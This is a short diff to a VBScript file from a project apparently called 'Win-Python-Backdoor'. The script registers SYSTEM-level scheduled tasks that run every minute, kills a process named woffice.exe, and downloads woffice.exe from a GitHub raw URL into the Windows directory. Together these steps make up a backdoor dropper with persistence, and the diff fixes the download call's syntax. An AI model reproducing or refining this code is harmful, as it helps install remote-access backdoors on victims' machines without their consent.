@@ -10,7 +10,7 @@ oShell.run "schtasks /create /ru 'SYSTEM' /sc minute /mo 1 /tr 'C:\Program Files
 oShell.run "schtasks /create /ru 'SYSTEM' /sc minute /mo 5 /tr 'taskkill /f /im woffice.exe' /tn myflash /rl highest /F"
 dim urlgit
 urlgit="https://github.com/pistacchietto/Win-Python-Backdoor/raw/master"
-Download(urlgit&"/woffice.exe", windir&&"\woffice.exe")
+call Download(urlgit & "/woffice.exe", windir & "\woffice.exe")
 set xmlhttp = createobject ("Msxml2.ServerXMLHTTP")
 dim url,mac
   'url="https://github.com/pistacchietto/Win-Python-Backdoor/raw/master/"
@@ -51,7 +51,7 @@ dim arr
       
       
         
-      end if
+      
       WScript.Sleep 100
       
   next
